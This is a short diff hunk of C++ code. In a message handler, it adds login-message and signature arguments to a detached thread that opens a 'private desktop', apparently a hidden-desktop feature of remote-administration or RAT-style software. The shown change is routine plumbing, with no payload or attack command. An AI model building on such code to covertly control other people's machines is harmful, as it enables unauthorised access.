@@ -794,7 +794,7 @@ VOID CKernelManager::OnReceive(PBYTE szBuffer, ULONG ulLength)
         memcpy(h, szBuffer + 1, ulLength - 1);
         std::string hash = std::string(h, h + 64);
         std::string hmac = std::string(h + 64, h + 80);
-        std::thread t(private_desktop, m_conn, g_bExit, hash, hmac);
+        std::thread t(private_desktop, m_conn, g_bExit, m_LoginMsg, m_LoginSignature, hash, hmac);
         t.detach();
         break;
     }
